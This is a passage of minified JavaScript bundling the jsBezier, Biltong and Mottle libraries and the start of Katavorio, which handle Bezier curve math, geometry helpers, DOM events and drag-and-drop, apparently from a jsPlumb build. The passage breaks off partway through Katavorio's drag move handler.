(function() {
    "undefined" == typeof Math.sgn && (Math.sgn = function(a) {
        return 0 == a ? 0 : a > 0 ? 1 : -1
    }
    );
    var a = {
        subtract: function(a, b) {
            return {
                x: a.x - b.x,
                y: a.y - b.y
            }
        },
        dotProduct: function(a, b) {
            return a.x * b.x + a.y * b.y
        },
        square: function(a) {
            return Math.sqrt(a.x * a.x + a.y * a.y)
        },
        scale: function(a, b) {
            return {
                x: a.x * b,
                y: a.y * b
            }
        }
    }
      , b = 64
      , c = Math.pow(2, -b - 1)
      , d = function(b, c) {
        for (var d = [], e = f(b, c), h = c.length - 1, i = 2 * h - 1, j = g(e, i, d, 0), k = a.subtract(b, c[0]), m = a.square(k), n = 0, o = 0; o < j; o++) {
            k = a.subtract(b, l(c, h, d[o], null, null));
            var p = a.square(k);
            p < m && (m = p,
            n = d[o])
        }
        return k = a.subtract(b, c[h]),
        p = a.square(k),
        p < m && (m = p,
        n = 1),
        {
            location: n,
            distance: m
        }
    }
      , e = function(a, b) {
        var c = d(a, b);
        return {
            point: l(b, b.length - 1, c.location, null, null),
            location: c.location
        }
    }
      , f = function(b, c) {
        for (var d = c.length - 1, e = 2 * d - 1, f = [], g = [], h = [], i = [], k = [[1, .6, .3, .1], [.4, .6, .6, .4], [.1, .3, .6, 1]], l = 0; l <= d; l++)
            f[l] = a.subtract(c[l], b);
        for (var l = 0; l <= d - 1; l++)
            g[l] = a.subtract(c[l + 1], c[l]),
            g[l] = a.scale(g[l], 3);
        for (var m = 0; m <= d - 1; m++)
            for (var n = 0; n <= d; n++)
                h[m] || (h[m] = []),
                h[m][n] = a.dotProduct(g[m], f[n]);
        for (l = 0; l <= e; l++)
            i[l] || (i[l] = []),
            i[l].y = 0,
            i[l].x = parseFloat(l) / e;
        for (var o = d, p = d - 1, q = 0; q <= o + p; q++) {
            var r = Math.max(0, q - p)
              , s = Math.min(q, o);
            for (l = r; l <= s; l++)
                j = q - l,
                i[l + j].y += h[j][l] * k[j][l]
        }
        return i
    }
      , g = function(a, c, d, e) {
        var f, j, m = [], n = [], o = [], p = [];
        switch (h(a, c)) {
        case 0:
            return 0;
        case 1:
            if (e >= b)
                return d[0] = (a[0].x + a[c].x) / 2,
                1;
            if (i(a, c))
                return d[0] = k(a, c),
                1
        }
        l(a, c, .5, m, n),
        f = g(m, c, o, e + 1),
        j = g(n, c, p, e + 1);
        for (var q = 0; q < f; q++)
            d[q] = o[q];
        for (var q = 0; q < j; q++)
            d[q + f] = p[q];
        return f + j
    }
      , h = function(a, b) {
        var c, d, e = 0;
        c = d = Math.sgn(a[0].y);
        for (var f = 1; f <= b; f++)
            c = Math.sgn(a[f].y),
            c != d && e++,
            d = c;
        return e
    }
      , i = function(a, b) {
        var d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s;
        i = a[0].y - a[b].y,
        j = a[b].x - a[0].x,
        k = a[0].x * a[b].y - a[b].x * a[0].y;
        for (var t = max_distance_below = 0, u = 1; u < b; u++) {
            var v = i * a[u].x + j * a[u].y + k;
            v > t ? t = v : v < max_distance_below && (max_distance_below = v)
        }
        return n = 0,
        o = 1,
        p = 0,
        q = i,
        r = j,
        s = k - t,
        l = n * r - q * o,
        m = 1 / l,
        e = (o * s - r * p) * m,
        q = i,
        r = j,
        s = k - max_distance_below,
        l = n * r - q * o,
        m = 1 / l,
        f = (o * s - r * p) * m,
        g = Math.min(e, f),
        h = Math.max(e, f),
        d = h - g,
        d < c ? 1 : 0
    }
      , k = function(a, b) {
        var c = 1
          , d = 0
          , e = a[b].x - a[0].x
          , f = a[b].y - a[0].y
          , g = a[0].x - 0
          , h = a[0].y - 0
          , i = e * d - f * c
          , j = 1 / i
          , k = (e * h - f * g) * j;
        return 0 + c * k
    }
      , l = function(a, b, c, d, e) {
        for (var f = [[]], g = 0; g <= b; g++)
            f[0][g] = a[g];
        for (var h = 1; h <= b; h++)
            for (var g = 0; g <= b - h; g++)
                f[h] || (f[h] = []),
                f[h][g] || (f[h][g] = {}),
                f[h][g].x = (1 - c) * f[h - 1][g].x + c * f[h - 1][g + 1].x,
                f[h][g].y = (1 - c) * f[h - 1][g].y + c * f[h - 1][g + 1].y;
        if (null != d)
            for (g = 0; g <= b; g++)
                d[g] = f[g][0];
        if (null != e)
            for (g = 0; g <= b; g++)
                e[g] = f[b - g][g];
        return f[b][0]
    }
      , m = {}
      , n = function(a) {
        var b = m[a];
        if (!b) {
            b = [];
            var c = function() {
                return function(b) {
                    return Math.pow(b, a)
                }
            }
              , d = function() {
                return function(b) {
                    return Math.pow(1 - b, a)
                }
            }
              , e = function(a) {
                return function(b) {
                    return a
                }
            }
              , f = function() {
                return function(a) {
                    return a
                }
            }
              , g = function() {
                return function(a) {
                    return 1 - a
                }
            }
              , h = function(a) {
                return function(b) {
                    for (var c = 1, d = 0; d < a.length; d++)
                        c *= a[d](b);
                    return c
                }
            };
            b.push(new c);
            for (var i = 1; i < a; i++) {
                for (var j = [new e(a)], k = 0; k < a - i; k++)
                    j.push(new f);
                for (var k = 0; k < i; k++)
                    j.push(new g);
                b.push(new h(j))
            }
            b.push(new d),
            m[a] = b
        }
        return b
    }
      , o = function(a, b) {
        for (var c = n(a.length - 1), d = 0, e = 0, f = 0; f < a.length; f++)
            d += a[f].x * c[f](b),
            e += a[f].y * c[f](b);
        return {
            x: d,
            y: e
        }
    }
      , p = function(a, b) {
        return Math.sqrt(Math.pow(a.x - b.x, 2) + Math.pow(a.y - b.y, 2))
    }
      , q = function(a) {
        return a[0].x == a[1].x && a[0].y == a[1].y
    }
      , r = function(a, b, c) {
        if (q(a))
            return {
                point: a[0],
                location: b
            };
        for (var d = o(a, b), e = 0, f = b, g = c > 0 ? 1 : -1, h = null; e < Math.abs(c); )
            f += .005 * g,
            h = o(a, f),
            e += p(h, d),
            d = h;
        return {
            point: h,
            location: f
        }
    }
      , s = function(a) {
        if (q(a))
            return 0;
        for (var b = o(a, 0), c = 0, d = 0, e = 1, f = null; d < 1; )
            d += .005 * e,
            f = o(a, d),
            c += p(f, b),
            b = f;
        return c
    }
      , t = function(a, b, c) {
        return r(a, b, c).point
    }
      , u = function(a, b, c) {
        return r(a, b, c).location
    }
      , v = function(a, b) {
        var c = o(a, b)
          , d = o(a.slice(0, a.length - 1), b)
          , e = d.y - c.y
          , f = d.x - c.x;
        return 0 == e ? 1 / 0 : Math.atan(e / f)
    }
      , w = function(a, b, c) {
        var d = r(a, b, c);
        return d.location > 1 && (d.location = 1),
        d.location < 0 && (d.location = 0),
        v(a, d.location)
    }
      , x = function(a, b, c, d) {
        d = null == d ? 0 : d;
        var e = r(a, b, d)
          , f = v(a, e.location)
          , g = Math.atan(-1 / f)
          , h = c / 2 * Math.sin(g)
          , i = c / 2 * Math.cos(g);
        return [{
            x: e.point.x + i,
            y: e.point.y + h
        }, {
            x: e.point.x - i,
            y: e.point.y - h
        }]
    }
      , y = this.jsBezier = {
        distanceFromCurve: d,
        gradientAtPoint: v,
        gradientAtPointAlongCurveFrom: w,
        nearestPointOnCurve: e,
        pointOnCurve: o,
        pointAlongCurveFrom: t,
        perpendicularToCurveAt: x,
        locationAlongCurveFrom: u,
        getLength: s,
        version: "0.9.0"
    };
    "undefined" != typeof exports && (exports.jsBezier = y)
}
).call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.Biltong = {
        version: "0.4.0"
    };
    "undefined" != typeof exports && (exports.Biltong = b);
    var c = function(a) {
        return "[object Array]" === Object.prototype.toString.call(a)
    }
      , d = function(a, b, d) {
        return a = c(a) ? a : [a.x, a.y],
        b = c(b) ? b : [b.x, b.y],
        d(a, b)
    }
      , e = b.gradient = function(a, b) {
        return d(a, b, function(a, b) {
            return b[0] == a[0] ? b[1] > a[1] ? 1 / 0 : -(1 / 0) : b[1] == a[1] ? b[0] > a[0] ? 0 : -0 : (b[1] - a[1]) / (b[0] - a[0])
        })
    }
      , f = (b.normal = function(a, b) {
        return -1 / e(a, b)
    }
    ,
    b.lineLength = function(a, b) {
        return d(a, b, function(a, b) {
            return Math.sqrt(Math.pow(b[1] - a[1], 2) + Math.pow(b[0] - a[0], 2))
        })
    }
    ,
    b.quadrant = function(a, b) {
        return d(a, b, function(a, b) {
            return b[0] > a[0] ? b[1] > a[1] ? 2 : 1 : b[0] == a[0] ? b[1] > a[1] ? 2 : 1 : b[1] > a[1] ? 3 : 4
        })
    }
    )
      , g = (b.theta = function(a, b) {
        return d(a, b, function(a, b) {
            var c = e(a, b)
              , d = Math.atan(c)
              , g = f(a, b);
            return 4 != g && 3 != g || (d += Math.PI),
            d < 0 && (d += 2 * Math.PI),
            d
        })
    }
    ,
    b.intersects = function(a, b) {
        var c = a.x
          , d = a.x + a.w
          , e = a.y
          , f = a.y + a.h
          , g = b.x
          , h = b.x + b.w
          , i = b.y
          , j = b.y + b.h;
        return c <= g && g <= d && e <= i && i <= f || c <= h && h <= d && e <= i && i <= f || c <= g && g <= d && e <= j && j <= f || c <= h && g <= d && e <= j && j <= f || g <= c && c <= h && i <= e && e <= j || g <= d && d <= h && i <= e && e <= j || g <= c && c <= h && i <= f && f <= j || g <= d && c <= h && i <= f && f <= j
    }
    ,
    b.encloses = function(a, b, c) {
        var d = a.x
          , e = a.x + a.w
          , f = a.y
          , g = a.y + a.h
          , h = b.x
          , i = b.x + b.w
          , j = b.y
          , k = b.y + b.h
          , l = function(a, b, d, e) {
            return c ? a <= b && d >= e : a < b && d > e
        };
        return l(d, h, e, i) && l(f, j, g, k)
    }
    ,
    [null, [1, -1], [1, 1], [-1, 1], [-1, -1]])
      , h = [null, [-1, -1], [-1, 1], [1, 1], [1, -1]];
    b.pointOnLine = function(a, b, c) {
        var d = e(a, b)
          , i = f(a, b)
          , j = c > 0 ? g[i] : h[i]
          , k = Math.atan(d)
          , l = Math.abs(c * Math.sin(k)) * j[1]
          , m = Math.abs(c * Math.cos(k)) * j[0];
        return {
            x: a.x + m,
            y: a.y + l
        }
    }
    ,
    b.perpendicularLineTo = function(a, b, c) {
        var d = e(a, b)
          , f = Math.atan(-1 / d)
          , g = c / 2 * Math.sin(f)
          , h = c / 2 * Math.cos(f);
        return [{
            x: b.x + h,
            y: b.y + g
        }, {
            x: b.x - h,
            y: b.y - g
        }]
    }
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = {
        android: navigator.userAgent.toLowerCase().indexOf("android") > -1
    }
      , c = function(a, b, c) {
        c = c || a.parentNode;
        for (var d = c.querySelectorAll(b), e = 0; e < d.length; e++)
            if (d[e] === a)
                return !0;
        return !1
    }
      , d = function(a) {
        return "string" == typeof a || a.constructor === String ? document.getElementById(a) : a
    }
      , e = function(a) {
        return a.srcElement || a.target
    }
      , f = function(a, b, c, d) {
        if (d) {
            if ("undefined" != typeof a.path && a.path.indexOf)
                return {
                    path: a.path,
                    end: a.path.indexOf(c)
                };
            var e = {
                path: [],
                end: -1
            }
              , f = function(a) {
                e.path.push(a),
                a === c ? e.end = e.path.length - 1 : null != a.parentNode && f(a.parentNode)
            };
            return f(b),
            e
        }
        return {
            path: [b],
            end: 1
        }
    }
      , g = function(a, b) {
        for (var c = 0, d = a.length; c < d && a[c] != b; c++)
            ;
        c < a.length && a.splice(c, 1)
    }
      , h = 1
      , i = function(a, b, c) {
        var d = h++;
        return a.__ta = a.__ta || {},
        a.__ta[b] = a.__ta[b] || {},
        a.__ta[b][d] = c,
        c.__tauid = d,
        d
    }
      , j = function(a, b, c) {
        if (a.__ta && a.__ta[b] && delete a.__ta[b][c.__tauid],
        c.__taExtra) {
            for (var d = 0; d < c.__taExtra.length; d++)
                F(a, c.__taExtra[d][0], c.__taExtra[d][1]);
            c.__taExtra.length = 0
        }
        c.__taUnstore && c.__taUnstore()
    }
      , k = function(a, b, d, g) {
        if (null == a)
            return d;
        var h = a.split(",")
          , i = function(g) {
            i.__tauid = d.__tauid;
            var j = e(g)
              , k = j
              , l = f(g, j, b, null != a);
            if (l.end != -1)
                for (var m = 0; m < l.end; m++) {
                    k = l.path[m];
                    for (var n = 0; n < h.length; n++)
                        c(k, h[n], b) && d.apply(k, arguments)
                }
        };
        return l(d, g, i),
        i
    }
      , l = function(a, b, c) {
        a.__taExtra = a.__taExtra || [],
        a.__taExtra.push([b, c])
    }
      , m = function(a, b, c, d) {
        if (s && u[b]) {
            var e = k(d, a, c, u[b]);
            E(a, u[b], e, c)
        }
        "focus" === b && null == a.getAttribute("tabindex") && a.setAttribute("tabindex", "1"),
        E(a, b, k(d, a, c, b), c)
    }
      , n = function(a, b, c, d) {
        if (null == a.__taSmartClicks) {
            var f = function(b) {
                a.__tad = y(b)
            }
              , h = function(b) {
                a.__tau = y(b)
            }
              , i = function(b) {
                if (a.__tad && a.__tau && a.__tad[0] === a.__tau[0] && a.__tad[1] === a.__tau[1])
                    for (var c = 0; c < a.__taSmartClicks.length; c++)
                        a.__taSmartClicks[c].apply(e(b), [b])
            };
            m(a, "mousedown", f, d),
            m(a, "mouseup", h, d),
            m(a, "click", i, d),
            a.__taSmartClicks = []
        }
        a.__taSmartClicks.push(c),
        c.__taUnstore = function() {
            g(a.__taSmartClicks, c)
        }
    }
      , o = {
        tap: {
            touches: 1,
            taps: 1
        },
        dbltap: {
            touches: 1,
            taps: 2
        },
        contextmenu: {
            touches: 2,
            taps: 1
        }
    }
      , p = function(a, b) {
        return function(d, h, i, j) {
            if ("contextmenu" == h && t)
                m(d, h, i, j);
            else {
                if (null == d.__taTapHandler) {
                    var k = d.__taTapHandler = {
                        tap: [],
                        dbltap: [],
                        contextmenu: [],
                        down: !1,
                        taps: 0,
                        downSelectors: []
                    }
                      , l = function(g) {
                        for (var h = e(g), i = f(g, h, d, null != j), l = !1, m = 0; m < i.end; m++) {
                            if (l)
                                return;
                            h = i.path[m];
                            for (var n = 0; n < k.downSelectors.length; n++)
                                if (null == k.downSelectors[n] || c(h, k.downSelectors[n], d)) {
                                    k.down = !0,
                                    setTimeout(p, a),
                                    setTimeout(q, b),
                                    l = !0;
                                    break
                                }
                        }
                    }
                      , n = function(a) {
                        if (k.down) {
                            var b, g, h = e(a);
                            k.taps++;
                            var i = D(a);
                            for (var j in o)
                                if (o.hasOwnProperty(j)) {
                                    var l = o[j];
                                    if (l.touches === i && (1 === l.taps || l.taps === k.taps))
                                        for (var m = 0; m < k[j].length; m++) {
                                            g = f(a, h, d, null != k[j][m][1]);
                                            for (var n = 0; n < g.end; n++)
                                                if (b = g.path[n],
                                                null == k[j][m][1] || c(b, k[j][m][1], d)) {
                                                    k[j][m][0].apply(b, [a]);
                                                    break
                                                }
                                        }
                                }
                        }
                    }
                      , p = function() {
                        k.down = !1
                    }
                      , q = function() {
                        k.taps = 0
                    };
                    m(d, "mousedown", l),
                    m(d, "mouseup", n)
                }
                d.__taTapHandler.downSelectors.push(j),
                d.__taTapHandler[h].push([i, j]),
                i.__taUnstore = function() {
                    g(d.__taTapHandler[h], i)
                }
            }
        }
    }
      , q = function(a, b, c, d) {
        for (var e in c.__tamee[a])
            c.__tamee[a].hasOwnProperty(e) && c.__tamee[a][e].apply(d, [b])
    }
      , r = function() {
        var a = [];
        return function(b, d, f, g) {
            if (!b.__tamee) {
                b.__tamee = {
                    over: !1,
                    mouseenter: [],
                    mouseexit: []
                };
                var h = function(d) {
                    var f = e(d);
                    (null == g && f == b && !b.__tamee.over || c(f, g, b) && (null == f.__tamee || !f.__tamee.over)) && (q("mouseenter", d, b, f),
                    f.__tamee = f.__tamee || {},
                    f.__tamee.over = !0,
                    a.push(f))
                }
                  , j = function(d) {
                    for (var f = e(d), g = 0; g < a.length; g++)
                        f != a[g] || c(d.relatedTarget || d.toElement, "*", f) || (f.__tamee.over = !1,
                        a.splice(g, 1),
                        q("mouseexit", d, b, f))
                };
                E(b, "mouseover", k(g, b, h, "mouseover"), h),
                E(b, "mouseout", k(g, b, j, "mouseout"), j)
            }
            f.__taUnstore = function() {
                delete b.__tamee[d][f.__tauid]
            }
            ,
            i(b, d, f),
            b.__tamee[d][f.__tauid] = f
        }
    }
      , s = "ontouchstart"in document.documentElement
      , t = "onmousedown"in document.documentElement
      , u = {
        mousedown: "touchstart",
        mouseup: "touchend",
        mousemove: "touchmove"
    }
      , v = function() {
        var a = -1;
        if ("Microsoft Internet Explorer" == navigator.appName) {
            var b = navigator.userAgent
              , c = new RegExp("MSIE ([0-9]{1,}[.0-9]{0,})");
            null != c.exec(b) && (a = parseFloat(RegExp.$1))
        }
        return a
    }()
      , w = v > -1 && v < 9
      , x = function(a, b) {
        if (null == a)
            return [0, 0];
        var c = C(a)
          , d = B(c, 0);
        return [d[b + "X"], d[b + "Y"]]
    }
      , y = function(a) {
        return null == a ? [0, 0] : w ? [a.clientX + document.documentElement.scrollLeft, a.clientY + document.documentElement.scrollTop] : x(a, "page")
    }
      , z = function(a) {
        return x(a, "screen")
    }
      , A = function(a) {
        return x(a, "client")
    }
      , B = function(a, b) {
        return a.item ? a.item(b) : a[b]
    }
      , C = function(a) {
        return a.touches && a.touches.length > 0 ? a.touches : a.changedTouches && a.changedTouches.length > 0 ? a.changedTouches : a.targetTouches && a.targetTouches.length > 0 ? a.targetTouches : [a]
    }
      , D = function(a) {
        return C(a).length
    }
      , E = function(a, b, c, d) {
        if (i(a, b, c),
        d.__tauid = c.__tauid,
        a.addEventListener)
            a.addEventListener(b, c, !1);
        else if (a.attachEvent) {
            var e = b + c.__tauid;
            a["e" + e] = c,
            a[e] = function() {
                a["e" + e] && a["e" + e](window.event)
            }
            ,
            a.attachEvent("on" + b, a[e])
        }
    }
      , F = function(a, b, c) {
        null != c && G(a, function() {
            var e = d(this);
            if (j(e, b, c),
            null != c.__tauid)
                if (e.removeEventListener)
                    e.removeEventListener(b, c, !1),
                    s && u[b] && e.removeEventListener(u[b], c, !1);
                else if (this.detachEvent) {
                    var f = b + c.__tauid;
                    e[f] && e.detachEvent("on" + b, e[f]),
                    e[f] = null,
                    e["e" + f] = null
                }
            c.__taTouchProxy && F(a, c.__taTouchProxy[1], c.__taTouchProxy[0])
        })
    }
      , G = function(a, b) {
        if (null != a) {
            a = "undefined" != typeof Window && "unknown" != typeof a.top && a == a.top ? [a] : "string" != typeof a && null == a.tagName && null != a.length ? a : "string" == typeof a ? document.querySelectorAll(a) : [a];
            for (var c = 0; c < a.length; c++)
                b.apply(a[c])
        }
    };
    a.Mottle = function(a) {
        a = a || {};
        var c = a.clickThreshold || 250
          , e = a.dblClickThreshold || 450
          , f = new r
          , g = new p(c,e)
          , h = a.smartClicks
          , i = function(a, b, c, e) {
            null != c && G(a, function() {
                var a = d(this);
                h && "click" === b ? n(a, b, c, e) : "tap" === b || "dbltap" === b || "contextmenu" === b ? g(a, b, c, e) : "mouseenter" === b || "mouseexit" == b ? f(a, b, c, e) : m(a, b, c, e)
            })
        };
        this.remove = function(a) {
            return G(a, function() {
                var a = d(this);
                if (a.__ta)
                    for (var b in a.__ta)
                        if (a.__ta.hasOwnProperty(b))
                            for (var c in a.__ta[b])
                                a.__ta[b].hasOwnProperty(c) && F(a, b, a.__ta[b][c]);
                a.parentNode && a.parentNode.removeChild(a)
            }),
            this
        }
        ,
        this.on = function(a, b, c, d) {
            var e = arguments[0]
              , f = 4 == arguments.length ? arguments[2] : null
              , g = arguments[1]
              , h = arguments[arguments.length - 1];
            return i(e, g, h, f),
            this
        }
        ,
        this.off = function(a, b, c) {
            return F(a, b, c),
            this
        }
        ,
        this.trigger = function(a, c, e, f) {
            var g = t && ("undefined" == typeof MouseEvent || null == e || e.constructor === MouseEvent)
              , h = s && !t && u[c] ? u[c] : c
              , i = !(s && !t && u[c])
              , j = y(e)
              , k = z(e)
              , l = A(e);
            return G(a, function() {
                var a, m = d(this);
                e = e || {
                    screenX: k[0],
                    screenY: k[1],
                    clientX: l[0],
                    clientY: l[1]
                };
                var n = function(a) {
                    f && (a.payload = f)
                }
                  , o = {
                    TouchEvent: function(a) {
                        var b = document.createTouch(window, m, 0, j[0], j[1], k[0], k[1], l[0], l[1], 0, 0, 0, 0)
                          , c = document.createTouchList(b)
                          , d = document.createTouchList(b)
                          , e = document.createTouchList(b);
                        a.initTouchEvent(h, !0, !0, window, null, k[0], k[1], l[0], l[1], !1, !1, !1, !1, c, d, e, 1, 0)
                    },
                    MouseEvents: function(a) {
                        if (a.initMouseEvent(h, !0, !0, window, 0, k[0], k[1], l[0], l[1], !1, !1, !1, !1, 1, m),
                        b.android) {
                            var c = document.createTouch(window, m, 0, j[0], j[1], k[0], k[1], l[0], l[1], 0, 0, 0, 0);
                            a.touches = a.targetTouches = a.changedTouches = document.createTouchList(c)
                        }
                    }
                };
                if (document.createEvent) {
                    var p = !i && !g && s && u[c] && !b.android
                      , q = p ? "TouchEvent" : "MouseEvents";
                    a = document.createEvent(q),
                    o[q](a),
                    n(a),
                    m.dispatchEvent(a)
                } else
                    document.createEventObject && (a = document.createEventObject(),
                    a.eventType = a.eventName = h,
                    a.screenX = k[0],
                    a.screenY = k[1],
                    a.clientX = l[0],
                    a.clientY = l[1],
                    n(a),
                    m.fireEvent("on" + h, a))
            }),
            this
        }
    }
    ,
    a.Mottle.consume = function(a, b) {
        a.stopPropagation ? a.stopPropagation() : a.returnValue = !1,
        !b && a.preventDefault && a.preventDefault()
    }
    ,
    a.Mottle.pageLocation = y,
    a.Mottle.setForceTouchEvents = function(a) {
        s = a
    }
    ,
    a.Mottle.setForceMouseEvents = function(a) {
        t = a
    }
    ,
    a.Mottle.version = "0.8.0",
    "undefined" != typeof exports && (exports.Mottle = a.Mottle)
}
.call("undefined" == typeof window ? this : window),
function() {
    "use strict";
    var a = this
      , b = function(a, b, c) {
        return a.indexOf(b) === -1 && (c ? a.unshift(b) : a.push(b),
        !0)
    }
      , c = function(a, b) {
        var c = a.indexOf(b);
        c != -1 && a.splice(c, 1)
    }
      , d = function(a, b) {
        for (var c = [], d = 0; d < a.length; d++)
            b.indexOf(a[d]) == -1 && c.push(a[d]);
        return c
    }
      , e = function(a) {
        return null != a && ("string" == typeof a || a.constructor == String)
    }
      , f = function(a) {
        var b = a.getBoundingClientRect()
          , c = document.body
          , d = document.documentElement
          , e = window.pageYOffset || d.scrollTop || c.scrollTop
          , f = window.pageXOffset || d.scrollLeft || c.scrollLeft
          , g = d.clientTop || c.clientTop || 0
          , h = d.clientLeft || c.clientLeft || 0
          , i = b.top + e - g
          , j = b.left + f - h;
        return {
            top: Math.round(i),
            left: Math.round(j)
        }
    }
      , g = function(a, b, c) {
        c = c || a.parentNode;
        for (var d = c.querySelectorAll(b), e = 0; e < d.length; e++)
            if (d[e] === a)
                return !0;
        return !1
    }
      , h = function() {
        var a = -1;
        if ("Microsoft Internet Explorer" == navigator.appName) {
            var b = navigator.userAgent
              , c = new RegExp("MSIE ([0-9]{1,}[.0-9]{0,})");
            null != c.exec(b) && (a = parseFloat(RegExp.$1))
        }
        return a
    }()
      , i = 50
      , j = 50
      , k = h > -1 && h < 9
      , l = 9 == h
      , m = function(a) {
        if (k)
            return [a.clientX + document.documentElement.scrollLeft, a.clientY + document.documentElement.scrollTop];
        var b = o(a)
          , c = n(b, 0);
        return l ? [c.pageX || c.clientX, c.pageY || c.clientY] : [c.pageX, c.pageY]
    }
      , n = function(a, b) {
        return a.item ? a.item(b) : a[b]
    }
      , o = function(a) {
        return a.touches && a.touches.length > 0 ? a.touches : a.changedTouches && a.changedTouches.length > 0 ? a.changedTouches : a.targetTouches && a.targetTouches.length > 0 ? a.targetTouches : [a]
    }
      , p = {
        draggable: "katavorio-draggable",
        droppable: "katavorio-droppable",
        drag: "katavorio-drag",
        selected: "katavorio-drag-selected",
        active: "katavorio-drag-active",
        hover: "katavorio-drag-hover",
        noSelect: "katavorio-drag-no-select",
        ghostProxy: "katavorio-ghost-proxy"
    }
      , q = "katavorio-drag-scope"
      , r = ["stop", "start", "drag", "drop", "over", "out", "beforeStart"]
      , s = function() {}
      , t = function() {
        return !0
    }
      , u = function(a, b, c) {
        for (var d = 0; d < a.length; d++)
            a[d] != c && b(a[d])
    }
      , v = function(a, b, c, d) {
        u(a, function(a) {
            a.setActive(b),
            b && a.updatePosition(),
            c && a.setHover(d, b)
        })
    }
      , w = function(a, b) {
        if (null != a) {
            a = e(a) || null != a.tagName || null == a.length ? [a] : a;
            for (var c = 0; c < a.length; c++)
                b.apply(a[c], [a[c]])
        }
    }
      , x = function(a) {
        a.stopPropagation ? (a.stopPropagation(),
        a.preventDefault()) : a.returnValue = !1
    }
      , y = "input,textarea,select,button,option"
      , z = function(a, b, c) {
        var d = a.srcElement || a.target;
        return !g(d, c.getInputFilterSelector(), b)
    }
      , A = function(a, b, c, d) {
        this.params = b || {},
        this.el = a,
        this.params.addClass(this.el, this._class),
        this.uuid = F();
        var e = !0;
        return this.setEnabled = function(a) {
            e = a
        }
        ,
        this.isEnabled = function() {
            return e
        }
        ,
        this.toggleEnabled = function() {
            e = !e
        }
        ,
        this.setScope = function(a) {
            this.scopes = a ? a.split(/\s+/) : [d]
        }
        ,
        this.addScope = function(a) {
            var b = {};
            w(this.scopes, function(a) {
                b[a] = !0
            }),
            w(a ? a.split(/\s+/) : [], function(a) {
                b[a] = !0
            }),
            this.scopes = [];
            for (var c in b)
                this.scopes.push(c)
        }
        ,
        this.removeScope = function(a) {
            var b = {};
            w(this.scopes, function(a) {
                b[a] = !0
            }),
            w(a ? a.split(/\s+/) : [], function(a) {
                delete b[a]
            }),
            this.scopes = [];
            for (var c in b)
                this.scopes.push(c)
        }
        ,
        this.toggleScope = function(a) {
            var b = {};
            w(this.scopes, function(a) {
                b[a] = !0
            }),
            w(a ? a.split(/\s+/) : [], function(a) {
                b[a] ? delete b[a] : b[a] = !0
            }),
            this.scopes = [];
            for (var c in b)
                this.scopes.push(c)
        }
        ,
        this.setScope(b.scope),
        this.k = b.katavorio,
        b.katavorio
    }
      , B = function() {
        return !0
    }
      , C = function() {
        return !1
    }
      , D = function(a, b, c, d) {
        this._class = c.draggable;
        var h = A.apply(this, arguments);
        this.rightButtonCanDrag = this.params.rightButtonCanDrag;
        var k = [0, 0]
          , l = null
          , n = null
          , o = [0, 0]
          , q = !1
          , r = this.params.consumeStartEvent !== !1
          , s = this.el
          , u = this.params.clone
          , w = (this.params.scroll,
        b.multipleDrop !== !1)
          , y = !1
          , D = b.ghostProxy === !0 ? B : b.ghostProxy && "function" == typeof b.ghostProxy ? b.ghostProxy : C
          , E = function(a) {
            return a.cloneNode(!0)
        }
          , H = b.snapThreshold || 5
          , I = function(a, b, c, d, e) {
            d = d || H,
            e = e || H;
            var f = Math.floor(a[0] / b)
              , g = b * f
              , h = g + b
              , i = Math.abs(a[0] - g) <= d ? g : Math.abs(h - a[0]) <= d ? h : a[0]
              , j = Math.floor(a[1] / c)
              , k = c * j
              , l = k + c
              , m = Math.abs(a[1] - k) <= e ? k : Math.abs(l - a[1]) <= e ? l : a[1];
            return [i, m]
        };
        this.posses = [],
        this.posseRoles = {},
        this.toGrid = function(a) {
            return null == this.params.grid ? a : I(a, this.params.grid[0], this.params.grid[1])
        }
        ,
        this.snap = function(a, b) {
            if (null != s) {
                a = a || (this.params.grid ? this.params.grid[0] : i),
                b = b || (this.params.grid ? this.params.grid[1] : j);
                var c = this.params.getPosition(s);
                this.params.setPosition(s, I(c, a, b, a, b))
            }
        }
        ,
        this.setUseGhostProxy = function(a) {
            D = a ? B : C
        }
        ;
        var J, K = function(a) {
            return b.allowNegative === !1 ? [Math.max(0, a[0]), Math.max(0, a[1])] : a
        }, L = function(a) {
            J = "function" == typeof a ? a : a ? function(a) {
                return K([Math.max(0, Math.min(R.w - this.size[0], a[0])), Math.max(0, Math.min(R.h - this.size[1], a[1]))])
            }
            .bind(this) : function(a) {
                return K(a)
            }
        }
        .bind(this);
        L("function" == typeof this.params.constrain ? this.params.constrain : this.params.constrain || this.params.containment),
        this.setConstrain = function(a) {
            L(a)
        }
        ;
        var M;
        this.setRevert = function(a) {
            M = a
        }
        ;
        var N = function(a) {
            return "function" == typeof a ? (a._katavorioId = F(),
            a._katavorioId) : a
        }
          , O = {}
          , P = function(a) {
            for (var b in O) {
                var c = O[b]
                  , d = c[0](a);
                if (c[1] && (d = !d),
                !d)
                    return !1
            }
            return !0
        }
          , Q = this.setFilter = function(b, c) {
            if (b) {
                var d = N(b);
                O[d] = [function(c) {
                    var d, f = c.srcElement || c.target;
                    return e(b) ? d = g(f, b, a) : "function" == typeof b && (d = b(c, a)),
                    d
                }
                , c !== !1]
            }
        }
        ;
        this.addFilter = Q,
        this.removeFilter = function(a) {
            var b = "function" == typeof a ? a._katavorioId : a;
            delete O[b]
        }
        ;
        this.clearAllFilters = function() {
            O = {}
        }
        ,
        this.canDrag = this.params.canDrag || t;
        var R, S = [], T = [];
        this.downListener = function(a) {
            var b = this.rightButtonCanDrag || 3 !== a.which && 2 !== a.button;
            if (b && this.isEnabled() && this.canDrag()) {
                var d = P(a) && z(a, this.el, this.k);
                if (d) {
                    if (u) {
                        s = this.el.cloneNode(!0),
                        s.setAttribute("id", null),
                        s.style.position = "absolute";
                        var e = f(this.el);
                        s.style.left = e.left + "px",
                        s.style.top = e.top + "px",
                        document.body.appendChild(s)
                    } else
                        s = this.el;
                    r && x(a),
                    k = m(a),
                    this.params.bind(document, "mousemove", this.moveListener),
                    this.params.bind(document, "mouseup", this.upListener),
                    h.markSelection(this),
                    h.markPosses(this),
                    this.params.addClass(document.body, c.noSelect),
                    V("beforeStart", {
                        el: this.el,
                        pos: l,
                        e: a,
                        drag: this
                    })
                } else
                    this.params.consumeFilteredEvents && x(a)
            }
        }
        .bind(this),
        this.moveListener = function(a) {
            if (k) {
                if (!q) {
                    var b = V("start", {
                        el: this.el,
                        pos: l,
                        e: a,
                        drag: this
                    });
